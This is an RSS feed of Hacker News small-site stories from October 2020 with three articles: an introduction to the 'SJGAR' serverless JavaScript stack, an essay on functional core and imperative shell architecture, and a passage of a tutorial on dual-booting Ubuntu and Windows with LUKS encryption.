<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 5]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 5. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 30 Oct 2020 00:45:37 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-5.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Fri, 30 Oct 2020 00:45:37 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[The Sjgar Stack]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24916319">thread link</a>) | @vijairamcharan
<br/>
October 28, 2020 | https://sjgarstack.org/blog/20201028/introducing-the-sjgar-stack | <a href="https://web.archive.org/web/*/https://sjgarstack.org/blog/20201028/introducing-the-sjgar-stack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p><em>Published October 28th, 2020 – 20 min read</em></p>
<p><strong>In this article I will introduce you to a new software stack that can be thought of as a spiritual successor to the MEAN or MERN stack. The technologies in the SJGAR stack were carefully combined to create something where the whole is greater than the sum of its parts. Focus on your customers, on business value and the developer experience. Do more, and keep things simple.</strong></p>
<p><strong>If you want to find out why the mix of Serverless, JavaScript, GraphQL, AWS and React could be interesting to you please read on.</strong></p>
<p><em>Disclaimer: This is <strong>not</strong> a sponsored post. All views expressed in this article are mine and may or may not be shared by my employer.</em></p>
<p><span>
      <a target="_blank" rel="noopener" href="https://sjgarstack.org/static/b43b87d495306e422c6f7e36bcb2e7df/857b3/pexels-archie-binamira-672358.jpg">
    <span></span>
  <img alt="Climb the mountain. Keep it simple. Photo by Archie Binamira from Pexels" title="Climb the mountain. Keep it simple. Photo by Archie Binamira from Pexels" src="https://sjgarstack.org/static/b43b87d495306e422c6f7e36bcb2e7df/de5ef/pexels-archie-binamira-672358.jpg" srcset="https://sjgarstack.org/static/b43b87d495306e422c6f7e36bcb2e7df/e6c22/pexels-archie-binamira-672358.jpg 205w, https://sjgarstack.org/static/b43b87d495306e422c6f7e36bcb2e7df/0d3fb/pexels-archie-binamira-672358.jpg 410w, https://sjgarstack.org/static/b43b87d495306e422c6f7e36bcb2e7df/de5ef/pexels-archie-binamira-672358.jpg 820w, https://sjgarstack.org/static/b43b87d495306e422c6f7e36bcb2e7df/4f4d6/pexels-archie-binamira-672358.jpg 1230w, https://sjgarstack.org/static/b43b87d495306e422c6f7e36bcb2e7df/b68c0/pexels-archie-binamira-672358.jpg 1640w, https://sjgarstack.org/static/b43b87d495306e422c6f7e36bcb2e7df/857b3/pexels-archie-binamira-672358.jpg 6000w" sizes="(max-width: 820px) 100vw, 820px" loading="lazy">
  </a>
    </span></p>

<p>I remember writing software in the period roughly between 2005 and 2015 where sometimes it could feel like every week something new was thrown at us. We were transitioning from desktop to the web and then cloud and mobile. We were just getting good at Object-oriented programming when a shift towards Functional Programming required us to rethink our mental models around our code. Cloud scale computing brought us from solely using SQL databases to study and use NoSQL databases. We went from embracing XML and SOAP to transitioning to JSON.</p>
<div><p><h3>Focus on your customers, on business value and the developer experience. Do more, and keep things simple.</h3></p></div>

<p>Looking at JavaScript alone there was also a lot of turmoil. The language started almost as a toy language to glue together simple elements on a web page. Then it slowly but steadily grew into becoming the most widely used programming language on the web. It even moved on beyond the browser and started to conquer the server with Node.js. A realm where Java and .NET were dominant before, now had to create some room for people starting to use JavaScript on the server.</p>
<p>On the web, framework after framework was becoming popular. Much to the point where they are still being refactored away ten years later. I remember moving from jQuery to Backbone or Knockout. I used Ember a bit and then also Angular. All of these seemed to offer some improvements over what was previously there. There were still enough rough edges however. It was clear we were not there yet.</p>
<div id="enter-the-calm-and-how-we-used-the-sjgar-stack-for-the-first-time"><h3><a href="#enter-the-calm-and-how-we-used-the-sjgar-stack-for-the-first-time" target="_blank" rel="noopener noreferrer" aria-label="enter the calm and how we used the sjgar stack for the first time permalink"></a>Enter the Calm and how we used the SJGAR stack for the first time.</h3></div>
<p>In 2015, I got the chance to work on a corporate startup project that was completely greenfield. We set out to create a platform with web and mobile apps with state-of-the-art user experience, and we wanted to fail or succeed fast. This meant we had to ensure a short time to market. We had to focus on developer experience and productivity. After having tried some pieces of technology on smaller projects, this was the perfect chance to put them together and figure out if they would play nicely together. In theory, it should all work, but previous experience had shown that you really need to start using them for a decent amount of time to figure out if the new advantages will really outweigh the drawbacks.</p>
<div><p><h3>It worked. It really worked.</h3></p></div>
<p>We built a web application using React and an accompanying mobile app using React Native. The backend was built using AWS Serverless technologies. We used DynamoDB as the single source of truth for data. The built-in event triggering system was used to run some Node.js code in a Lambda to stream this data to a managed Elasticsearch cluster, so we could support the search and query capabilities we needed. We created a GraphQL API using the reference server implementation graphql-js (Apollo Server and Client weren't a thing back then). Again this was run in Lambda. To make sure the web application was performant enough for our end users we used a Lambda to implement Server Side Rendering (Gatsby and Next.js also weren't a thing back then). We also used the Serverless framework, a bit shaky at that time, to write our infra as code.</p>
<p>With a handful of full stack engineers we were able to deliver this project successfully to production. We could deliver new versions of our microservices independently, and we would do this multiple times a day.</p>
<p>It worked. It really worked.</p>
<p>We started with almost zero costs for infrastructure. The most expensive service was the Elasticsearch service. The other services would easily service our first customers on the free tier. I think we never spent over 100 euros a month. Without Elasticsearch it would probably not have been higher than 10 euros a month. We launched and started running ad campaigns to lure customers to our new offering. For these ad campaigns we were spending over a thousand euros per month. It was clear that we now could go to the business and tell them we could do innovation projects with IT running costs of close to zero.</p>
<p>I remember we were able to move some logic from the web app to the authentication provider (we used Auth0 back then since Cognito was still a bit too new) by just copying some JavaScript code. Similarly, we were able to move code from frontend to backend. More generally we were able to take what we learned in a certain context, and apply it to a different one. JavaScript allowed us to learn a single programming language and write code for the Web, Mobile and Cloud. React allowed us to use a single framework to structure applications and do the state management for both Web and Mobile. Using Flexbox we could even apply the same UI layout system in these apps. With the complex and time-consuming nature of layout work, it was great that we were able to reuse our knowledge and tools to enjoy a great productivity boost.</p>
<p>Going Serverless meant we did not have to spend time on managing servers. The code and the system would just work. No disks filling up, no security patches to be applied, no certificates to be updated. AWS had given us a platform with great performance and stability. Everything would just run.</p>
<p>After running this project in 2015 and 2016, in the end it was shuttered because it did not align with our business goals. Only later I came to realize this set of technologies would stand the test of time, and would do so pretty well.</p>
<div id="okay-this-thing-needs-a-name"><h3><a href="#okay-this-thing-needs-a-name" target="_blank" rel="noopener noreferrer" aria-label="okay this thing needs a name permalink"></a>Okay. This Thing Needs A Name.</h3></div>
<p>Fast-forward a bit to when I joined my current team and company early 2019. We formed a new innovation department and dreamed of a future where we helped turn our 175-year-old financial company into a fintech. Teaming up with the department that was our business counterpart, in the first year we built and delivered a total of fourteen projects with a relatively common two pizza team. In the previous nineteen years of my career I had never witnessed anything like this. We built smaller projects like landing pages, but also large ones like a new platform to sell houses using data and AI. We also built a fairly complex API to serve as the backend for an IoT driven car insurance. We even managed to surprise ourselves and win a hackathon in our first year with a mobile app for planting trees.</p>
<div><p><h3>Five years after having first used this set of technologies it was clear that they still were around. Not only were they still around, they had become even stronger with a bigger community supporting them.</h3></p></div>
<p>Many things fell into place to make this a success. For one, it were the amazing people we joined. I consider myself lucky to this day that we met them and were able to make all of these things happen. It was almost as if we started in a performing phase as a team, skipping the forming, norming and storming phases altogether.</p>
<p>Besides the people the technology played an important role here. Five years after having first used this set of technologies it was clear that they still were around. Not only were they still around, they had become even stronger with a bigger community supporting them.</p>
<p>What was really cool was that we were able to deliver all these different types of applications using basically the same architecture. For the IoT insurance, the API we delivered we implemented a lightweight event sourced system using mainly DynamoDB and Lambda. We later added a future event system where we combined DynamoTTL and Step Functions to combine high and low resolution timers, all of which were inspired by a set of blog posts and a tweet we found on the web.</p>
<p>For the housing platform we combined Cognito, Azure AD, DynamoDB, Lambda, AppSync, S3 and CloudFront to deliver a platform that was highly performant. Gatsby helped us leverage React’s power to build statically rendered, SEO-friendly pages, hosted on S3 and made available to the wide internet using CloudFront and Route53. On the backend we created a GraphQL API to, on the one hand, power the build-time data requirements. On the other hand it also powered the real-time admin panel we needed for providing customers support.</p>
<p>There were many more projects that used very similar architectures. Five years after first having used these technologies we were still able to use them to build modern applications. In our hiring process I remember seeing the smiles on the faces of the engineers when we would mention our tech stack.</p>
<div><p><h3>Which parts are going to be successful for at least the next five years?</h3></p></div>
<p>There was this one thing I noticed though. Whenever I wanted to explain our technology stack, I was summing up this combination of technologies one by one. Time after time saying things like “Our stack is JavaScript based, uses the React ecosystem and runs on AWS Serverless... And oh yeah we use GraphQL as a BFF for our apps.” A couple of days later I would say something like “We build apps using React and use JavaScript/TypeScript. Our APIs are running on AWS Lambda using NodeJS.”. And then many more variations of these sentences.</p>
<p>Okay. This thing needs a name.</p>
<p>Back in the days we had the LAMP stack, and some time after that there was the MEAN stack. Acronyms that became part of our vocabulary to help explain the stack we were using, or even inspired greenfield projects to combine these technologies. People would think, hey, I recently have been hearing a lot of buzz around the MEAN …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sjgarstack.org/blog/20201028/introducing-the-sjgar-stack">https://sjgarstack.org/blog/20201028/introducing-the-sjgar-stack</a></em></p>]]>
            </description>
            <link>https://sjgarstack.org/blog/20201028/introducing-the-sjgar-stack</link>
            <guid isPermaLink="false">hacker-news-small-sites-24916319</guid>
            <pubDate>Wed, 28 Oct 2020 07:55:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Grand Unified Theory of Software Architecture]]>
            </title>
            <description>
<![CDATA[
Score 170 | Comments 85 (<a href="https://news.ycombinator.com/item?id=24915497">thread link</a>) | @nreece
<br/>
October 27, 2020 | https://danuker.go.ro/the-grand-unified-theory-of-software-architecture.html | <a href="https://web.archive.org/web/*/https://danuker.go.ro/the-grand-unified-theory-of-software-architecture.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
        <div>
    <section id="content">
        <article>
            
            <div>
                
                <p>Take <strong>Uncle Bob's</strong> Clean Architecture and map its correspondences with <strong>Gary Bernhardt's</strong> thin imperative shell around a functional core, and you get an understanding of how to cheaply maintain and scale software!</p>
<p>This is what <a href="https://rhodesmill.org/brandon/">Mr. Brandon Rhodes</a> did. It's not every day that I find such clear insight.</p>
<p>I am honored to have found his <a href="https://rhodesmill.org/brandon/talks/#clean-architecture-python">presentation</a> and <a href="https://rhodesmill.org/brandon/slides/2014-07-pyohio/clean-architecture/">slides</a> explaining  <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">Uncle Bob's Clean Architecture</a> and Gary Bernhardt's PyCon talks of <a href="https://archive.org/details/pyvideo_422___units-need-testing-too">2011</a>, <a href="https://pycon-2012-notes.readthedocs.io/en/latest/fast_tests_slow_tests.html">2012</a>, and <a href="https://www.destroyallsoftware.com/talks/boundaries">2013</a>.</p>
<p>Mr. Rhodes offers such a distilled view, that he can show you these crucial concepts in 3 slides of code. I will go ahead and summarize what he said and add a tiny bit of my insight.</p>
<p>Copyright of all Python code on this page belongs to <a href="https://rhodesmill.org/brandon/">Mr. Brandon Rhodes</a>, and copyright of the diagram belongs to <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">Robert C. Martin (Uncle Bob)</a>. I use these under (hopefully) fair use (nonprofit and educational).</p>


<p>First of all, we need to be on the same page, in order to be able to understand each other. Here are the words I'll use:</p>
<ul>
<li>Function: I use "function" or "pure function" to refer to a Python "function" that only uses its parameters for input, returns a result as output, and does not cause any other side-effects (such as I/O). <ul>
<li>A pure function returns the same output given the same inputs.</li>
<li>A pure function may be called any number of times without changing the system state - it should have no influence on DB, UI, other functions or classes.</li>
<li>This is very similar to a mathematical function: takes you from <em>x</em> to <em>y</em> and nothing else happens.</li>
<li>Sadly we can't have only pure functions; software has a <strong>purpose</strong> of causing side-effects.</li>
</ul>
</li>
<li>Procedure, Routine, or Subroutine: A piece of code that executes, that may or may not have side effects. This is a "function" in Python, but might not be a "pure function".</li>
<li>Tests: automated unit tests. By "unit" I mean not necessarily just a class, but a behavior. If you want, see more details in <a href="https://danuker.go.ro/tdd-revisited-pytest-updated-2020-09-03.html#update-2020-09-03-keep-coupling-low">the coupling chapter of my previous post</a>.</li>
</ul>

<div><pre><span></span><code><span>import</span> <span>requests</span>                      <span># Listing 1</span>
<span>from</span> <span>urllib</span> <span>import</span> <span>urlencode</span>

<span>def</span> <span>find_definition</span><span>(</span><span>word</span><span>):</span>
    <span>q</span> <span>=</span> <span>'define '</span> <span>+</span> <span>word</span>
    <span>url</span> <span>=</span> <span>'http://api.duckduckgo.com/?'</span>
    <span>url</span> <span>+=</span> <span>urlencode</span><span>({</span><span>'q'</span><span>:</span> <span>q</span><span>,</span> <span>'format'</span><span>:</span> <span>'json'</span><span>})</span>
    <span>response</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>)</span>     <span># I/O</span>
    <span>data</span> <span>=</span> <span>response</span><span>.</span><span>json</span><span>()</span>           <span># I/O</span>
    <span>definition</span> <span>=</span> <span>data</span><span>[</span><span>u</span><span>'Definition'</span><span>]</span>
    <span>if</span> <span>definition</span> <span>==</span> <span>u</span><span>''</span><span>:</span>
        <span>raise</span> <span>ValueError</span><span>(</span><span>'that is not a word'</span><span>)</span>
    <span>return</span> <span>definition</span>
</code></pre></div>
<p>Here, we have a piece of code that prepares a URL, then gets some data over the network (I/O), then validates the result (a word definition) and returns it.</p>
<p>This is a bit much: a procedure should ideally do one thing only. While this small-ish procedure is quite readable still, it is a metaphor for a more developed system - where it could be arbitrarily long.</p>
<p>The current knee-jerk reaction is to <em>hide</em> the I/O operations somewhere far away. Here is the same code after extracting the I/O lines:</p>

<div><pre><span></span><code><span>def</span> <span>find_definition</span><span>(</span><span>word</span><span>):</span>           <span># Listing 2</span>
    <span>q</span> <span>=</span> <span>'define '</span> <span>+</span> <span>word</span>
    <span>url</span> <span>=</span> <span>'http://api.duckduckgo.com/?'</span>
    <span>url</span> <span>+=</span> <span>urlencode</span><span>({</span><span>'q'</span><span>:</span> <span>q</span><span>,</span> <span>'format'</span><span>:</span> <span>'json'</span><span>})</span>
    <span>data</span> <span>=</span> <span>call_json_api</span><span>(</span><span>url</span><span>)</span>
    <span>definition</span> <span>=</span> <span>data</span><span>[</span><span>u</span><span>'Definition'</span><span>]</span>
    <span>if</span> <span>definition</span> <span>==</span> <span>u</span><span>''</span><span>:</span>
        <span>raise</span> <span>ValueError</span><span>(</span><span>'that is not a word'</span><span>)</span>
    <span>return</span> <span>definition</span>

<span>def</span> <span>call_json_api</span><span>(</span><span>url</span><span>):</span>
    <span>response</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>)</span>     <span># I/O</span>
    <span>data</span> <span>=</span> <span>response</span><span>.</span><span>json</span><span>()</span>           <span># I/O</span>
    <span>return</span> <span>data</span>
</code></pre></div>
<p>In Listing #2, the I/O is extracted from the top-level procedure. </p>
<p>The problem is, the code is still <strong>coupled</strong> - <code>call_json_api</code> is called whenever you want to test anything - even the building of the URL or the parsing of the result.</p>
<p><strong>Coupling kills software.</strong></p>
<p>A good rule of thumb to spot coupling is this: Can you test a piece of code without having to mock or dependency inject like Frankenstein?</p>
<p>Here, we can't test <code>find_definition</code> without somehow replacing <code>call_json_api</code> from inside it, in order to avoid making HTTP requests.</p>
<p>Let's find out what a better solution looks like.</p>

<div><pre><span></span><code><span>def</span> <span>find_definition</span><span>(</span><span>word</span><span>):</span>           <span># Listing 3</span>
    <span>url</span> <span>=</span> <span>build_url</span><span>(</span><span>word</span><span>)</span>
    <span>data</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>)</span><span>.</span><span>json</span><span>()</span>  <span># I/O</span>
    <span>return</span> <span>pluck_definition</span><span>(</span><span>data</span><span>)</span>

<span>def</span> <span>build_url</span><span>(</span><span>word</span><span>):</span>
    <span>q</span> <span>=</span> <span>'define '</span> <span>+</span> <span>word</span>
    <span>url</span> <span>=</span> <span>'http://api.duckduckgo.com/?'</span>
    <span>url</span> <span>+=</span> <span>urlencode</span><span>({</span><span>'q'</span><span>:</span> <span>q</span><span>,</span> <span>'format'</span><span>:</span> <span>'json'</span><span>})</span>
    <span>return</span> <span>url</span>

<span>def</span> <span>pluck_definition</span><span>(</span><span>data</span><span>):</span>
    <span>definition</span> <span>=</span> <span>data</span><span>[</span><span>u</span><span>'Definition'</span><span>]</span>
    <span>if</span> <span>definition</span> <span>==</span> <span>u</span><span>''</span><span>:</span>
        <span>raise</span> <span>ValueError</span><span>(</span><span>'that is not a word'</span><span>)</span>
    <span>return</span> <span>definition</span>
</code></pre></div>
<p>Here, the procedure at the top (aka. the <span><strong>imperative shell</strong></span> of the program) is handling the I/O, and everything else is moved to <span><strong>pure functions</strong></span> (<code>build_url</code>, <code>pluck_definition</code>). The <span><strong>pure functions</strong></span> are easily testable by just calling them on made-up data structures; no Frankenstein needed.</p>
<p>This separation into an <span><strong>imperative shell</strong></span> and <span><strong>functional core</strong></span> is an encouraged idea by Functional Programming.</p>
<p>Ideally, though, in a real system, you wouldn't test elements as small as these routines, but integrate more of the system. See <a href="https://danuker.go.ro/tdd-revisited-pytest-updated-2020-09-03.html#update-2020-09-03-keep-coupling-low">the coupling chapter of my previous post</a> to understand the trade-offs.</p>

<p>Look at <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">Uncle Bob's Clean Architecture chart</a> (Copyright Robert C. Martin aka. Uncle Bob) :
<img alt="The Clean Architecture" src="https://danuker.go.ro/images/CleanArchitecture.jpg"></p>
<p>Uncle Bob's <span><strong>Use Cases</strong></span> and <span><strong>Entities</strong></span> (red and yellow circles of the chart) map to the <span><strong>pure functions</strong></span> we saw earlier - <code>build_url</code> and <code>pluck_definition</code> from Listing 3, and the <span><strong>plain objects</strong></span> they receive as parameters and send as outputs. <em>(updated 2020-10-28)</em></p>
<p>Uncle Bob's <span><strong>Interface Adapters</strong></span> (green circle) map to the top-level <span><strong>imperative shell</strong></span>  from earlier - <code>find_definition</code> from Listing 3, handling only I/O to the outside (Web, DB, UI, other frameworks).</p>
<p><a href="https://www.reddit.com/r/programming/comments/jj7ave/the_grand_unified_theory_of_software_architecture/gabst6z/?context=3">Update 2020-10-28</a>: A "Model" object in today's MVC frameworks is a poisoned apple: it is not a <a href="https://khanlou.com/2014/12/pure-objects/">"pure" object</a> or <a href="http://xunitpatterns.com/Humble%20Object.html">"humble" object</a>, but one that can produce side effects like saving or loading from the database. Their "save" and "read" methods litter your code with untestable side-effects all over. Avoid them, or confine them to the periphery of your system and reduce their influence accordingly (they are actually a hidden <span><strong>Interface Adapter</strong></span>) due to interacting with the DB.</p>
<p>Notice the arrows on the left side of the circles, pointing inwards to more and more abstract parts. These are procedure or function calls. Our code is called by the outside. <strong>This has some exceptions. Whatever you do, the database won't call your app. But the web can, a user can through a UI, the OS can through STDIN, and a timer can, at regular intervals (such as in a game).</strong> <em>(updated 2020-10-28)</em></p>
<p>The top-level procedure:</p>
<ol>
<li>gets the input, </li>
<li>adapts it to simple objects acceptable to the system,</li>
<li>pushes it through the functional core,</li>
<li>gets the returned value from the functional core,</li>
<li>adapts it for the output device,</li>
<li>and pushes it out to the output device.</li>
</ol>
<p>This lets us easily test the functional core. Ideally, most of a production system should be pure-functional.</p>

<p>If you reduce the <span><strong>imperative shell</strong></span> and move code into the <span><strong>functional core</strong></span>, each test can verify almost the entire (now-functional) stack, but stopping short of actually performing external actions.</p>
<p>You can then test the imperative shell using <strong>fewer integration tests</strong>: you only need to check that it is <strong>correctly connected</strong> to the functional core.</p>
<p>Having two users for the system - the real user and the unit tests - and listening to both, lets you guide your architecture so as to <strong>minimize coupling</strong> and build a more <strong>flexible system</strong>.</p>
<p>Having a flexible system lets you implement new features and change existing ones <strong>quickly and cheaply</strong>, in order to <strong>stay competitive as a business</strong>.</p>
<p>Comments are much appreciated. I am yet to apply these insights, and I may be missing something!</p>
<p><strong>Edit 2020-10-28:</strong> I have tried out this methodology in some small TDD Katas, and together with TDD, it works great. But I am not employed right now, so I can't say I've <em>really</em> tried it.</p>
            </div>
            <!-- /.entry-content -->


        </article>
    </section>

        </div>
        
    </div>
</div></div>]]>
            </description>
            <link>https://danuker.go.ro/the-grand-unified-theory-of-software-architecture.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24915497</guid>
            <pubDate>Wed, 28 Oct 2020 05:19:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Dual-Boot Ubuntu 20.04 and Windows 10 with Encryption]]>
            </title>
            <description>
<![CDATA[
Score 71 | Comments 63 (<a href="https://news.ycombinator.com/item?id=24914573">thread link</a>) | @Fiveplus
<br/>
October 27, 2020 | https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html | <a href="https://web.archive.org/web/*/https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p><img src="https://www.mikekasberg.com/images/posts/dual-boot-encryption-full.jpg" alt="Image for "></p>
  <p><span>08 Apr 2020</span></p><p>When you run the Ubuntu installer, there’s an option to dual-boot Ubuntu with an
existing Windows installation. There’s also an option to encrypt your Ubuntu
installation, but <em>only if you erase everything and install ubuntu</em>. There’s no
automatic way to install Ubuntu alongside Windows 10 with encryption. And while
there are plenty of tutorials for dual-booting Ubuntu and Windows, many of them
are outdated – often referencing an MBR partition table – and almost none of
them seem to address encrypting your Ubuntu partition.</p>

<blockquote>
  <p>Dual-booting with encrypted storage should not be this hard in 2020.</p>

  <p>–Me, while figuring out how to do this.</p>
</blockquote>

<p>In reality, once you figure it out, it’s not that hard. The tricky thing is that
this isn’t well-documented <strong>anywhere</strong>! So I’m hoping to fix that with this
tutorial blog post. Honestly, if you know enough about Ubuntu to set up a
dual-boot with Windows, it’s only a little bit harder to do it with encryption.
I prepared this tutorial on a Dell Latitude e7450, and I fine-tuned it when I
tested it on my Dell Precision 5510. So it should work with almost no
modification on most Dell systems, and with only minor modifications
(particularly around BIOS setup) on most other types of computers.</p>

<h2 id="references">References</h2>

<p>To write this guide, I compiled information from several sources. Here are some
of the most useful references I found:</p>

<ul>
  <li><a href="https://gist.github.com/luispabon/db2c9e5f6cc73bb37812a19a40e137bc">XPS 15 9560 Dual-Boot with Encryption Notes</a>,
by <a href="https://gist.github.com/luispabon">luispabon</a>. I followed these notes pretty
closely, but modified some partition sizes and names based on other guides.</li>
  <li><a href="https://gist.github.com/mdziekon/221bdb597cf32b46c50ffab96dbec08a">XPS 15 9570 Dual-Boot with Encryption Notes</a>,
by <a href="https://gist.github.com/mdziekon">mdziekon</a>, upon which the above is based.</li>
  <li><a href="https://help.ubuntu.com/community/Full_Disk_Encryption_Howto_2019">Full Disk Encryption HowTo 2019</a>,
from the Ubuntu Community Wiki. This is a great resource, but deals with
encryption without dual-booting.</li>
  <li><a href="https://help.ubuntu.com/community/ManualFullSystemEncryption">Manual Full System Encryption</a>,
from the Ubuntu Community Wiki. This is longer, and isn’t focused on
dual-booting, but provides great details on the way certain things work.</li>
</ul>

<p>It is worth noting that this method doesn’t encrypt <code>/boot</code>. While there are
valid reasons for encrypting /boot, the graphical installer does not encrypt it
when you do a graphical install with LUKS. As such, I’m matching that precedent,
and keeping the simplicity of an unencrypted /boot partition. Thus, the guide
I’ve compiled below is just about the <strong>simplest way to have a LUKS encryption
with dual-boot.</strong></p>

<h2 id="why-encryption-is-important">Why encryption is important</h2>

<p>I began using encrypted storage on all my personal computers 5 or 6 years ago
after noticing that all the companies I’d worked for required it, and had good
reason to. Laptops get lost and stolen all the time. They’re high-value items
that are small and easy to carry. And when a thief gets your laptop, there’s
tons of valuable information on it that they can use or sell. Even if you use a
password to log in, it’s easy for an attacker to gain access to your data if
your disk isn’t encrypted – for example, by using a live USB stick. And once
they have that data, they might get access to online accounts, bank statements,
emails, and tons of other data. For me, an encrypted hard disk isn’t optional
anymore – its a necessity.</p>

<h2 id="an-overview">An Overview</h2>

<p>So what are we going to do? This tutorial will help you set up a system to
<strong>dual-boot Ubuntu 20.04 and Windows 10</strong>. (I haven’t tested it, but it should
work with most other modern versions (~16.04+) of Ubuntu or Windows.) The system
will use a GPT hard disk with UEFI (your BIOS must support UEFI). The Ubuntu
partition will be encrypted with LUKS.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> The Windows partition can optionally
be encrypted with BitLocker. I’m going to keep the Ubuntu installation as close
to a “default” installation as possible – no fancy tricks like a separate
<code>/home</code> partition, but it should be somewhat easy to add that yourself if you
really want to.</p>

<p>I’m going to start with a blank hard disk, installing both Windows 10 and Ubuntu
from scratch. If you already have Windows installed and you want to keep it, you
should be able to shrink your windows partition and join us in phase 3 (though
you might want to skim phases 1 and 2 to understand what we did).</p>

<p>To give you a broad overview of where we’re headed, here’s what we’re going to
do:</p>

<ol>
  <li>Prepare the installation media and computer</li>
  <li>Install Windows 10</li>
  <li>Create an encrypted partition for Ubuntu</li>
  <li>Install Ubuntu</li>
</ol>

<p>Of course, as with any new OS installation, you should back up any important
data before proceeding. <strong>The instructions below will erase all the data on your
hard disk.</strong> Proceed at your own risk; I’m not responsible for any damage or
data loss.</p>



<p>Since we’re installing both Windows 10 and Ubuntu from scratch, we’ll need a USB
stick for each. If you don’t already have a computer running Ubuntu or Windows,
making the installation media will be a little harder – but there are tutorials
for that and I’ll let you figure it out on your own.</p>

<ol>
  <li>Create a Windows Installer USB stick.  The easiest way is to use the <a href="https://www.microsoft.com/software-download/">Windows
10 Media Creation Tool</a> from a
computer that’s already running Windows.</li>
  <li>Create an Ubuntu 20.04 USB stick. The easiest way is to <a href="https://ubuntu.com/download/desktop">download the
ISO</a> and use the Startup Disk Creator on a
computer that’s already running Ubuntu.</li>
</ol>

<p>Great! We’ve got our USB sticks ready to go! One final thing before we get
started – we need to make sure our BIOS is set up correctly. In particular, we
want to make sure we’re using UEFI to boot our OS.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<p><img src="https://www.mikekasberg.com/images/dual-boot-encryption/dell-bios.jpg" alt="The Dell BIOS"></p>

<ol start="3">
  <li>Ensure your computer is running the latest BIOS available. This is important
because an out-of-date BIOS can have bugs, and those bugs sometimes affect
things like UEFI, non-Windows operating systems, or other components we’ll be
touching.</li>
  <li>Edit your BIOS settings. The following names are probably specific to Dell
BIOS, but other manufacturers will have similar settings.
    <ol>
      <li>Under <code>General</code> and <code>Boot Sequence</code>, make sure your <code>Boot
List Option</code> is set to <code>UEFI</code>.</li>
      <li>Under <code>General</code> and <code>Advanced Boot Options</code>, I disabled
<code>Legacy Option ROMs</code>. It’s important that both OSes install in UEFI mode.
(You can probably enable this when installation is complete if you care).</li>
      <li>Under <code>Security</code>, <code>TPM Security</code> must be enabled if you
want to easily set up BitLocker in Windows.</li>
      <li>I disabled <code>Secure Boot</code>. I’m not sure if this is absolutely required, and
you can try leaving it on or re-enabling it when you’re done if you want.</li>
    </ol>
  </li>
</ol>

<p>Now that our BIOS is configured for UEFI, we’re going to set up our hard disk.</p>

<div>
<p><b>For this tutorial, your BIOS must support UEFI!</b></p>
<p>Most modern computers support this, but if yours doesn't this tutorial won't
work for you. You should consider:</p>

<ul>
  <li>Installing only Linux with encryption using the graphical installer.</li>
  <li>OR Installing only Windows with encryption.</li>
  <li>OR Dual-booting Linux and Windows without encryption using Ubuntu's graphical installer.</li>
  <li>OR Finding another tutorial or figuring out how to do this with an MBR disk.</li>
</ul>
</div>

<ol start="5">
  <li><strong>Completely erase</strong> your hard disk and set it up for UEFI by doing the
following.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>
    <ol>
      <li>Boot your Ubuntu USB stick and use <code>Try without installing</code>.</li>
      <li>Open a terminal. Make it fullscreen while you’re at it.</li>
      <li>Figure out what your primary hard disk is called. It will probably be
either <code>/dev/sda</code> or <code>/dev/nvme0n1</code>. Importantly, it’s <strong>not</strong> <code>/dev/sda1</code> or
<code>/dev/nvme0n1p1</code> – those are partitions of the disk. One way to figure out what
yours is called is to run <code>lsblk</code> and look at the disk size. Throughout the rest
of this guide, I’m going to refer to <code>/dev/sda</code>. <strong>If yours is not
<code>/dev/sda</code>, replace <code>/dev/sda</code> with your own (perhaps <code>/dev/sdb</code> or
<code>/dev/nvme0n1</code>) for the rest of this guide.</strong></li>
      <li>
        <p>Run the following commands. This will initialize the drive as a GPT drive
and create a 550M EFI system partition formatted as FAT32.</p>

        <div><div><pre><code>$ sudo su
# sgdisk --zap-all /dev/sda
# sgdisk --new=1:0:+550M /dev/sda
# sgdisk --change-name=1:EFI /dev/sda
# sgdisk --typecode=1:ef00 /dev/sda
# mkfs.fat -F 32 /dev/sda1
</code></pre></div>        </div>
      </li>
    </ol>
  </li>
</ol>

<p>OK, phase 1’s complete. We have our installation media ready to go and the
computer’s BIOS and hard drive is set up correctly. Next, we’ll install Windows.</p>

<h2 id="phase-2-install-windows">Phase 2: Install Windows</h2>

<p>In this phase, we’re going to install Windows. Note that when we do this, we’re
